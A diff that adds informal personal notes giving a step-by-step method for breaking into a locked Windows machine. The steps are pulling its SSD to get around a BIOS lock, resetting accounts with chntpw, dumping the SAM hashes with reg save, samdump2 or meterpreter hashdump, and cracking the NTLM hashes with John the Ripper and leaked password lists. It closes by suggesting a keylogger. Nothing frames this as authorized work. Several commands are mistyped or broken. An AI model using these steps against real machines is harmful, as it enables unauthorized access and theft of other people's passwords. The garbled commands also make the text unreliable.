@@ -1,0 +1,51 @@
+On the phone cuz I break my computer every other day
+Try to unlock bios. If it ends in -8fc8 suffix then it can’t be easily cracked and you need to take apart.
+Take apart and put into NVME SSD to USB adapter and plug in to a different computer that has an unlocked bios
+Boot to kali Linux
+Before logging off the windows ssd restart idk why but it only works when u press restart and turn it off midway through that 
+Once your in Kali go and click on the windows drive on the desktop (the ssd usb drive you have plugged in via adapter)
+Find the Sam file location 
+Right click -> open terminal here -> sudo su
+chntpw -i SAM
+From there boom you can now login as admin. To become administrator clear and unlock the administrator account. To find admin password unlock and clear one of the other accounts present (do NOT clear admin password or you will be unable to dump the hash)
+Go back into windows and log in to the account that you unlocked (.\account)
+Now you have administrator privs it’s basically just an issue of dumbing the SAM file. Haven’t done this yet, but apparently in windows if you type in 
+reg save hklm\sam c:\sam
+reg save hklm\system c\system
+(Last parameter is where you want to copy the file)
+Apparently there’s another way - stay in kali Linux open new terminal window and use metasploits “meterpreter> use priv” “meterpreter> hashdump” maybe figure out from there idk
+Then in kali Linux type in to console 
+apt-get install samdump2
+samdump2 system sam 
+And then you should get a massive long hash. Like Administrator:500:abc123abc123 
+Abc123 and so on is the hash. By memory it’s encoded in NTLM
+To decrypt you can put into any online website but they don’t work well, I reccomend using John the ripper and a leaked wordlist (either rockyou.txt or the 2015 linkdin password leak, both available on github). Wordlists are much faster than brute forcing 
+However if a wordlist doesn’t work for whatever reason then it might be a stronger password.
+In that case you will need to brute force. For this (and wordlists also) you will need to download either hashcat (if you have a strong GPU) or John the ripper (if you have a strong CPU). I will be using John the ripper but feel free to use your own method with hashcat.
+John the ripper commands:
+(Make sure you extract JTR to root of your windows system it’s easier for the cmd mcfuckery u have to do)
+For wordlist: (obviously navigate in cmd terminal to the location of John.exe)
+.\john.exe passwordfile -wordlist=“wordlist.txt”
+For brute force:
+.\john.exe —incremental passwordfile
+Or use John in Kali Linux:
+Terminal commands:
+john
+john —format=NT —rules -w=wordlist hashfile
+
+I think this the only one needed tbh
+
+john —format=NT —show hashfile.txt
+
+This shows it but weirdly half cracked
+
+john —format=LM —show hashfile.txt | cut -d: -f 2 | send ‘/^\s*$/d’> mydictionary.txt 
+But this kinda dumb
+
+
+
+
+
+
+
+…or just get a keylogger :p
